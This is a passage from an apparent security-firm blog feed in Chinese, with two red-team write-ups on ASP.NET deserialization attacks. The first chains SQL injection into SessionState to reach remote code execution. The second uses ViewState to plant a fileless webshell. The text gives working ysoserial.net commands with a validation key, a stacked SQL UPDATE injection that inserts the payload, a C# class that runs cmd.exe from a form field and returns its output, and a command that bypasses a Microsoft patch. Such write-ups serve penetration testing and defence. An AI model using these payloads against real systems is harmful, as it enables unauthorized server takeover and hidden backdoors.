                &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_objects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;跟進去一看，發現 HttpStaticObjectsCollection 取出一些 bytes 之後，又把過程轉交給 &lt;code class=&quot;highlighter-rouge&quot;&gt;AltSerialization.ReadValueFromStream&lt;/code&gt; 進行處理，看到這的朋友們或許會臉上三條線地心想：「該不會又要追進去吧 . . 」，不過其實到此為止就已足夠，因為 AltSerialization 實際上類似於 BinaryFormatter 的包裝，到此已經有足夠資訊作利用，另外還有一個原因兼好消息，當初我程式碼追到此處時，上網一查這個物件，發現 &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt; 已經有建立 AltSerialization 反序列化 payload 的 plugin，所以可以直接掏出這個利器來使用！下面一行指令就可以產生執行系統指令 calc.exe 的 base64 編碼後的 payload。&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; Altserialization &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; HttpStaticObjectsCollection &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;calc.exe&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;不過到此還是有個小問題需要解決，ysoserial.net 的 AltSerialization plugin 所建立的 payload 是攻擊 SessionStateItemCollection 或 HttpStaticObjectsCollection 兩個類別的反序列化操作，而我們儲存在資料庫中的 session 序列化資料是由在此之上還額外作了一層包裝的 SessionStateUtility 類別處理的，所以必須要再做點修飾。回頭再去看看程式碼，會發現 SessionStateUtility 也只添加了幾個 bytes，減化後如下所示：&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;對於 Int32 要添加 4 個 bytes，Boolean 則是 1 個 byte，而因為要讓程式路徑能進入 HttpStaticObjectsCollection 的分支，必須讓第 6 個 byte 為 1 才能讓條件達成，先將原本從 ysoserial.net 產出的 payload 從 base64 轉成 hex 表示，再前後各別添加 6、1 bytes，如下示意圖：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  timeout    false  true            HttpStaticObjectsCollection             eof
┌─────────┐  ┌┐     ┌┐    ┌───────────────────────────────────────────────┐ ┌┐
00 00 00 00  00     01    010000000001140001000000fff ... 略 ... 0000000a0b ff
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;修飾完的這個 payload 就能用來攻擊 SessionStateUtility 類別了！&lt;/p&gt;

&lt;p&gt;最後的步驟就是利用開頭的 SQL Injection 將惡意的序列化內容注入進去資料庫，如果正常瀏覽目標網站時有出現 ASP.NET_SessionId 的 Cookie 就代表已經有一筆對應的 Session 記錄儲存在資料庫裡，所以我們只需要執行如下的 SQL Update 語句：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?id=1; UPDATE ASPState.dbo.ASPStateTempSessions
       SET SessionItemShort = 0x{Hex_Encoded_Payload}
       WHERE SessionId LIKE &#39;{ASP.NET_SessionId}%25&#39;; --
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;分別將 &lt;code class=&quot;highlighter-rouge&quot;&gt;{ASP.NET_SessionId}&lt;/code&gt; 替換成自己的 ASP.NET_SessionId 的 Cookie 值以及 &lt;code class=&quot;highlighter-rouge&quot;&gt;{Hex_Encoded_Payload}&lt;/code&gt; 替換成前面準備好的序列化 payload 即可。&lt;/p&gt;

&lt;p&gt;那假如沒有 ASP.NET_SessionId 怎麼辦？這表示目標可能還未儲存任何資料在 Session 之中，所以也就不會產生任何記錄在資料庫裡，但既然沒有的話，那我們就硬塞一個 Cookie 給它！ASP.NET 的 SessionId 是透過亂數產生的 24 個字元，但使用了客製化的字元集，可以直接使用以下的 Python script 產生一組 SessionId，例如：plxtfpabykouhu3grwv1j1qw，之後帶上 &lt;code class=&quot;highlighter-rouge&quot;&gt;Cookie: ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw&lt;/code&gt; 瀏覽任一個 aspx 頁面，理論上 ASP.NET 就會自動在資料庫裡添加一筆記錄。&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;abcdefghijklmnopqrstuvwxyz012345&#39;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;choice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;假如在資料庫裡仍然沒有任何記錄出現，那就只能手動刻 INSERT 的 SQL 來創造一個記錄，至於如何刻出這部分？只要看看程式碼應該就可以很容易構造出來，所以留給大家自行去玩 :P&lt;/p&gt;

&lt;p&gt;等到 Payload 順利注入後，只要再次用這個 Cookie &lt;code class=&quot;highlighter-rouge&quot;&gt;ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw&lt;/code&gt; 瀏覽任何一個 aspx 頁面，就會觸發反序列化執行任意系統指令！&lt;/p&gt;

&lt;p&gt;題外話，利用 SessionState 的反序列化取得 ASP.NET 網站應用程式主機控制權的場景並不僅限於 SQL Injection。在內網滲透測試的過程中，經常會遇到的情境是，我們透過各方的資訊洩漏 ( 例如：內部 GitLab、任意讀檔等 ) 取得許多 SQL Server 的帳號、密碼，但唯獨取得不了目標 ASP.NET 網站應用程式的 Windows 主機的帳號密碼，而為了達成目標 ( 控制指定的網站主機 )，我們就曾經使用過這個方式取得目標的控制權，所以作為內網橫向移動的手段也是稍微有價值且非常有趣。至於還能有什麼樣的花樣與玩法，就要靠各位持續地發揮想像力！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2020/04/21/from-sql-to-rce-exploit-aspnet-app-with-sessionstate/</link>
                <guid>https://devco.re/blog/2020/04/21/from-sql-to-rce-exploit-aspnet-app-with-sessionstate</guid>
                <pubDate>Tue, 21 Apr 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>玩轉 ASP.NET VIEWSTATE 反序列化攻擊、建立無檔案後門</title>
                <description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;這篇文章呼應我在研討會 &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE Conference 2019&lt;/a&gt; 分享的主題，如何用小缺陷一步步擊破使用 ASP.NET 框架所撰寫的堅固的網站應用程式，其中之一的內容就是關於我們在此之前過往紅隊演練專案中，成功數次透過 VIEWSTATE 的反序列化攻擊並製造進入內網突破口的利用方式以及心得，也就是此篇文章的主題。&lt;/p&gt;

&lt;h2 id=&quot;內文&quot;&gt;內文&lt;/h2&gt;

&lt;p&gt;最近微軟產品 Exchange Server 爆出一個嚴重漏洞 CVE-2020-0688，問題發生的原因是每台 Exchange Server 安裝完後在某個 Component 中都使用了同一把固定的 Machine Key，而相信大家都已經很熟悉取得 Machine Key 之後的利用套路了，可以竄改 ASP.NET Form 中的 VIEWSTATE 參數值以進行反序列化攻擊，從而達成 Remote Code Execution 控制整台主機伺服器。&lt;/p&gt;

&lt;p&gt;更詳細的 CVE-2020-0688 漏洞細節可以參考 ZDI blog：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&quot;&gt;CVE-2020-0688: Remote Code Execution on Microsoft Exchange Server Through Fixed Cryptographic Keys&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;對於 VIEWSTATE exploit 分析在網路上已經有無數篇文章進行深入的探討，所以在此篇文章中將不再重複贅述，而今天主要想聊聊的是關於 VIEWSTATE exploit 在滲透測試中如何進行利用。&lt;/p&gt;

&lt;p&gt;最基本、常見的方式是直接使用工具 &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt; 的 ViewState Plugin 產生合法 MAC 與正確的加密內容，TypeConfuseDelegate gadget 經過一連串反射呼叫後預設會 invoke Process.Start 呼叫 cmd.exe，就可以觸發執行任意系統指令。&lt;/p&gt;

&lt;p&gt;例如：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g TypeConfuseDelegate
              -c &quot;echo 123 &amp;gt; c:\pwn.txt&quot;
              --generator=&quot;CA0B0334&quot;
              --validationalg=&quot;SHA1&quot;
              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;異常的 VIEWSTATE 通常會導致 aspx 頁面回應 500 Internal Server Error，所以我們也無法直接得知指令執行的結果，但既然有了任意執行，要用 PowerShell 回彈 Reverse Shell 或回傳指令結果到外部伺服器上並不是件難事。&lt;/p&gt;

&lt;p&gt;But ..&lt;/p&gt;

&lt;p&gt;在滲透測試的實戰中，事情往往沒這麼美好。現今企業資安意識都相對高，目標伺服器環境出現以下幾種限制都已是常態：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;封鎖所有主動對外連線&lt;/li&gt;
  &lt;li&gt;禁止查詢外部 DNS&lt;/li&gt;
  &lt;li&gt;網頁目錄無法寫入&lt;/li&gt;
  &lt;li&gt;網頁目錄雖可寫，但存在 Website Defacement 防禦機制，會自動復原檔案&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;所以這時就可以充分利用另一個 ActivitySurrogateSelectorFromFile gadget 的能力，這個 gadget 利用呼叫 Assembly.Load 動態載入 .NET 組件達成 Remote Code Execution，換句話說，可以使我們擁有在與 aspx 頁面同一個 Runtime 環境中執行任意 .NET 語言程式碼的能力，而 .NET 預設都會存在一些指向共有資源的全域靜態變數可以使用，例如 &lt;a href=&quot;https://docs.microsoft.com/zh-tw/dotnet/api/system.web.httpcontext.current?view=netframework-4.8&quot;&gt;System.Web.HttpContext.Current&lt;/a&gt; 就可以取得當下 HTTP 請求上下文的物件，也就像是我們能利用它來執行自己撰寫的 aspx 網頁的感覺，並且過程全是在記憶體中動態處理，於是就等同於建立了無檔案的 WebShell 後門！&lt;/p&gt;

&lt;p&gt;我們只需要修改 -g 的參數成 ActivitySurrogateSelectorFromFile，而 -c 參數放的就不再是系統指令而是想執行的 ExploitClass.cs C# 程式碼檔案，後面用 ; 分號分隔加上所依賴需要引入的 dll。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile
              -c &quot;ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll&quot;
              --generator=&quot;CA0B0334&quot;
              --validationalg=&quot;SHA1&quot;
              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;關於需要引入的 dll 可以在安裝了 .NET Framework 的 Windows 主機上找到，像我的環境是在這個路徑 &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319&lt;/code&gt; 之中。&lt;/p&gt;

&lt;p&gt;至於最關鍵的 ExploitClass.cs 該如何撰寫呢？將來會試著提交給 &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt;，就可以在範例檔案裡找到它，或是可以先直接看這裡：&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;E&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Web&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Web&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ClearError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Clear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Diagnostics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Diagnostics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileName&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;cmd.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cmd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arguments&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/c &quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RedirectStandardOutput&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RedirectStandardError&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StartInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UseShellExecute&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StandardOutput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadToEnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;End&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;Server.ClearError()&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;Response.End()&lt;/code&gt; 都是必要且重要的一步，因為異常的 VIEWSTATE 必然會使得 aspx 頁面回應 500 或其他非預期的 Server Error，而呼叫第一個函式可以協助清除在當前 Runtime 環境下 stack 中所記錄的錯誤，而呼叫 End() 可以讓 ASP.NET 將當前上下文標記為請求已處理完成並直接將 Response 回應給客戶端，避免程式繼續進入其他 Error Handler 處理導致無法取得指令執行的輸出結果。&lt;/p&gt;

&lt;p&gt;到這個步驟的話，理論上你只要送出請求時固定帶上這個惡意 VIEWSTATE，就可以像操作一般 WebShell 一樣：&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20200311/play-with-viewstate-exploit-and-create-fileless-webshell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不過有時也會出現這種情境：&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20200311/cover.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不論怎麼改 Payload 再重送永遠都是得到 Server Error，於是就開始懷疑自己的人生 Q_Q&lt;/p&gt;

&lt;p&gt;但也別急著灰心，可能只是你遇上的目標有很乖地定期更新了伺服器而已，因為微軟曾為了 ActivitySurrogateSelector 這個 gadget 加上了一些 patch，導致無法直接利用，好在有其他研究者馬上提供了解決方法使得這個 gadget 能再次被利用！&lt;/p&gt;

&lt;p&gt;詳細細節可以閱讀這篇文章：&lt;a href=&quot;https://silentbreaksecurity.com/re-animating-activitysurrogateselector/&quot;&gt;Re-Animating ActivitySurrogateSelector&lt;/a&gt; By &lt;a href=&quot;https://silentbreaksecurity.com/author/nick/&quot;&gt;Nick Landers&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;總而言之，如果遇到上述情形，可以先嘗試用以下指令產生 VIEWSTATE 並發送一次給伺服器，順利的話就能使目標 Runtime 環境下的 DisableActivitySurrogateSelectorTypeCheck 變數值被設為 true，隨後再發送的 ActivitySurrogateSelector gadget 就不會再噴出 500 Server Error 了。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck
              -c &quot;ignore&quot;
              --generator=&quot;CA0B0334&quot;
              --validationalg=&quot;SHA1&quot;
              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

